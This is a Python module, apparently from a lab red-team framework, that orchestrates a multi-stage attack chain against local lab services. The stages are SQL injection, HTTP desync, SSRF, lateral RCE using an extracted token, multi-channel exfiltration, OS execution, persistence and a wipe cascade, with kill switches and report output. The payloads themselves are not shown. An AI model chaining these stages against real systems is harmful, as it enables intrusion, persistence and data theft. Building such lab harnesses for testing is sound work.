import pathlib
import time
import uuid

from . import engine, exfil, fixtures, osrun, ospersist, railway, synthesize, wipecascade
from .evidence import Evidence
from .recoil import phase_desync, phase_sqli


ID = "RECOIL-v2"


def _rot_token(seed: str, stage: str) -> str:
    import hashlib
    return hashlib.sha256(f"{seed}:{stage}".encode()).hexdigest()[:10]


def run(lab, settings: dict, ev, report_dir: pathlib.Path) -> dict:
    rotor_seed = settings.get("rotor_seed")
    hiber = _rot_token(rotor_seed, "hiber")
    wrap = _rot_token(rotor_seed, "wrap")

    steps = []

    sq = engine.FamilyState("sqli-b", "127.0.0.1", lab.web_port)
    sqi = phase_sqli(sq, ev, max(8, int(settings.get("max_iterations", 24))))
    steps.append({"phase": "sqli-b", "host": "A/web", "axis": sqi.get("shape"), "reliability": sqi.get("reliability")})

    ds = engine.FamilyState("desync", "127.0.0.1", lab.front_port)
    ctrl = engine.FamilyState("desync", "127.0.0.1", lab.patched_port)
    de = phase_desync(ds, ctrl, ev, max(8, int(settings.get("max_hops", 2))))
    steps.append({"phase": "desync", "host": "front->origin", "axis": de.get("shape"), "reliability": de.get("reliability")})

    ssrf_rel = railway.ssrf_read(lab, ev) if settings.get("ssrf_read") else {"ok": False, "reliability": 0.0}
    steps.append({"phase": "ssrf-blind", "host": "origin->B", "axis": ssrf_rel.get("shape"), "reliability": ssrf_rel.get("reliability")})

    token = sqi.get("extracted") or ssrf_rel.get("inband_flag") or ""
    steps.append({"phase": "token", "host": "A->B", "value": (token or "none")[:14], "kind": "flag-as-token"})

    rce_a = de.get("admin_marker", "none")
    rce_b = "none"
    if token:
        rce_b = railway.host_b_admin_exec(lab, ev, token)
        steps.append({"phase": "rce-lateral", "host": "B", "value": rce_b, "kind": "extracted-flag as X-Auth"})

    exf = exfil.exfil_secret((token or "RECOIL{lab-demo}"), lab, ev, channels=tuple(settings.get("exfil_channels", ["echo", "desync", "timing"])))
    steps.append({"phase": "exfil", "host": "A/B lanes", "acked": exf["acked_chunks"], "sha": exf["sha_match"]})

    os_ok = {"osruns": 0, "persisted": False, "persist_state": {}, "wipe": None}
    eng = uuid.uuid4().hex[:8]
    per = None
    if settings.get("os_exec"):
        rr = osrun.double_tap(["hostname"], reps=3)
        steps.append({"phase": "os-exec", "host": "localhost(engine)", "rel_reps": len(rr.get("consistent", [])), "value": rr.get("consistent")})
        os_ok["osruns"] = len(rr.get("consistent", []))
        if settings.get("persist"):
            per = ospersist.Persister(eng, max_heal=int(settings.get("max_heal", 2)), no_registry=bool(settings.get("no_registry")))
            os_ok["persist_state"] = per.arm()
            os_ok["persisted"] = True
            os_ok["liveness_t0"] = per.liveness()
            if settings.get("self_heal_probe"):
                os_ok["self_heal_probe"] = per.heal()
        os_ok["disarmed"] = per.disarm() if per else False
        os_ok["wipe"] = wipecascade.cascade(eng, report_dir, persister=per) if settings.get("wipe_cascade") else None

    report = synthesize.render(
        {
            "engagement": settings.get("engagement", time.strftime("%Y%m%d-%H%M%S")),
            "nodes": steps,
            "kill_switches": {
                "allowlist": "lock",
                "os_exec": bool(settings.get("os_exec")),
                "persist": bool(settings.get("persist")),
                "no_registry": bool(settings.get("no_registry")),
                "wipe_cascade": bool(settings.get("wipe_cascade")),
                "halt_budget": settings.get("halt_budget"),
                "survivors_after_wipe": (os_ok.get("wipe") or {}).get("survivors_total"),
            },
        },
        report_dir,
    )
    ev.verdict_ok("ladder-report", path=str(report), steps=len(steps))
    return {"steps": steps, "token": token, "rce": {"A_origin": rce_a, "B_admin": rce_b}, "exfil": exf, "os": os_ok}